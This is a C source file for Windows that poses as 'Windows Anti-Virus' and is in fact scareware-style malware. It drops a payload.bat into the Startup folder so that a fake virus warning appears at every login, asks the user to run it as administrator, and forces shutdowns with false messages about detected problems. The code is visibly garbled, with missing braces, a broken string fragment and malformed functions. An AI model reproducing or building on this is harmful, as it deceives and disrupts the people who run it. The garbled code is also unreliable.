#include <Windows.h>

#include <stdio.h>

#include <string.h>

#include <stdlib.h>

#include <ctype.h>
void tunnel() {
system("echo %USERPROFILE%>user");
}
void tscan() {
FILE *f,*fp;
char s[800],ch;
int i = 0;
f=fopen("user","r");
if(f==NULL) {
exit(0);
}
while(feof(f)==0)
fscanf(f,"%c",&ch);
if(ch=='\n') {
return 0;
}
s[i]=ch;
i++;
}
fclose(f);
system("echo start 'http:fp=fopen(s,"w");
if(fp==NULL)
f=fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.bat","w");
if(f==NULL)
system("cls");
remove("user");
printf("\nError... Run This Program As Administrator To Continue\n");
system("timeout 10");
exit(0);
}
fprintf(f,"\necho off\necho Windows Anti-Virus\npause");
fclose(f);
system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
exit(0);
}
fprintf(fp,"\necho off\necho Windows Anti-Virus has dected a virus!\npause");
fclose(fp);
}
void ok()
remove("user");
}
void run()
tunnel();
tscan();
}
void pause()
printf("\n");
system("pause");
}
int main()
system("title Windows Anti-Virus");
run();
ok();
printf("\n|----- Resources Diagnostics -----|\n");
printf("\n Checking PC for compatibility\n");
system("systeminfo");
system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix (4) detected problems.\"");
pause();
}
